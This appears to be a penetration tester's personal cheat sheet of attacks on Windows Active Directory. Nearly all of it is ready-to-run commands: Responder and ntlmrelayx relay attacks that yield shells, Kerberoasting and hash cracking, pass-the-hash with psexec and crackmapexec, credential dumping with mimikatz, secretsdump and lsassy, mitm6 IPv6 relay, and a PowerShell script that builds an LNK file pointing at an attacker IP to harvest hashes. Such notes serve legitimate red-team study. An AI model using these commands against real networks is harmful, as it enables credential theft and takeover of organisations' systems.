
## Active Directory (AD) Exploitation

### #LDAP and #SMB Enumeration

- #LDAP:
    - `ldapsearch -x -h <target> -b "dc=example,dc=com"`
    - `nmap --script=ldap-search -p 389 <target>`
- #SMB:
    - `nmap --script=smb-enum-users,smb-os-discovery -p445 <target>`
- #Responder: `responder -I <interface> -dwv`
	- crack hash with #hashcat (see above)
- #ntlmrelayx SMB no sign:
	- Step 1: Identify Hosts Without #SMB Signing
		- `nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24`
		* may need `-Pn` to get it to work
	- Step 2: Run #Responder
		- `sudo mousepad /etc/responder/Responder.conf`
		* Turn off #SMB and #HTTP
	- Step 3: Run #Responder
		- `sudo responder -I tun0 -dwv`
	- Step 4: Set up your relay
		- `sudo ntlmrelayx.py -tf targets.txt -smb2support`
		* #responder forwards hash to #ntlmrelay and then #ntlmrelay forwards hash to target
	- Step 5: An Event Occurs...
		* cause an event by pointing to a fileshare on user account
	- Step 6: Win
		* Other Wins
			* `sudo ntlmrelayx.py -tf targets.txt -smb2support -i`
				* gives an interactive shell!
					* `nc 127.0.0.1 11000`
			* `sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"`
				* can run commands!

### #Kerberoasting

- Step 1: #GetUserSPNs
	- `impacket-GetUserSPNs <DOMAIN/username:password> -dc-ip <ip of DC> -request`
- Step 2: Crack hash
	- `hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt`
- Enumerate Users: `rpcclient -U "" <target>` then `enumdomusers`
- Request Service Tickets: `GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USER>:<PASSWORD>`
- Crack Hashes: `john --wordlist=rockyou.txt --format=krb5tgs hashes.txt`

### #Pass-the-Hash & #LateralMovement (can do these with passwords or hashes)

- #Psexec: `psexec.py <domain>/<user>@<target> -hashes <NTLM-hash>`
- #WMIExec: `wmiexec.py <domain>/<user>@<target> -hashes <NTLM-hash>`
- #Mimikatz:
	- `privilege :: debug`
	- `sekurlsa::logonPasswords
- #crackmapexec / #netexec : hash and password
	- #cme
		- `crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <pass>` 		
		- `crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth`
		- `crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --sam`
		- `crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --lsa`
		- `crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --shares`
	- #netexec
		- `netexec smb <ip/CIDR> -u <user> -d <domain> -p <pass>`
		- `netexec smb <ip/CIDR> -u <user> -H <hash> --local-auth`
		- `netexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --sam`
		- `netexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --lsa`
		- `netexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --shares`
	- #SMB, #WinRM, etc. Run `crackmapexec -h` and `netexec -h` for all options
	- #secretsdump: hash and password
		- `secretsdump.py DOMAIN.local/user:'Password1'@10.X.X.X`
		- `secretsdump.py administrator:@10.X.X.X -hashes aad3bXXX:7facdcXXX`
		- Crack hashes, if #cPassword hash, decrypt with:
			- `gpp-decrypt <hash>`
	- Built-in modules 
		- `crackmapexec smb -L`
			- `gpp_password`
			- `impersonation`
			- `keepass_discover`
			- `lsassy` - ***#1 choice***
		- `crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth -M lsassy`
		- `netexec smb <ip/CIDR> -u <user> -H <hash> --local-auth -M lsassy`
	- `cmedb` for database of successful logins

### #IPv6 Attack with #ntlmrelay and #mitm6 

- `ntlmrelayx.py -6 -t ldaps://<DC-IP> -wh fakewpad.DOMAIN.local -l lootme`
	- run this before mitm6 and ensure no errors.
- `sudo mitm6 -d marvel.local`
	* Any event (reboot/login) will allow us to take the event, and relay to DC.
- *Don't run more than 10 minutes, can cause network outages.*

### #LNK File Attack

- Step 1: generate file via PowerShell 
	- IP is attacker ip, RUN PowerShell AS ADMIN, Enter each line one at a time
```PowerShell
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\192.168.95.130\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```
- Step 2: rename file and put in file share
	- rename file from `test` to `@test` just so it shows first in order and hash can be returned back
	- Put it into file share
- Step 3: Start Responder
	- `sudo responder -I eth0 -dP`
	- make sure smb and http are enabled in responder
		- `cd /usr/share/responder`
		- `sudo nano Responder.conf`
		- Change SMB and HTTP to `ON`
- Step 4: Navigate to file share and load the LNK file
	- relies on user to go to file share, once the LNK file is visible on their file explorer in file share, we will see captured hashes
- Automated attack using #crackmapexec / #netexec :
	- `netexec smb <DOMAIN-IP> -d DOMAIN.local -u user -p Password1 -M slinky -o NAME=test SERVER=<IP>`

### #printer PrintNightmare

- check if target is vulnerabile using `rpcdump.py`​  
	- `rpcdump.py @192.168.95.132 | egrep 'MS-RPRN|MS-PAR`
	- To exploit, follow [steps](https://github.com/cube0x0/CVE-2021-1675) on cube0x0 RCE or calebstewart LPE. 
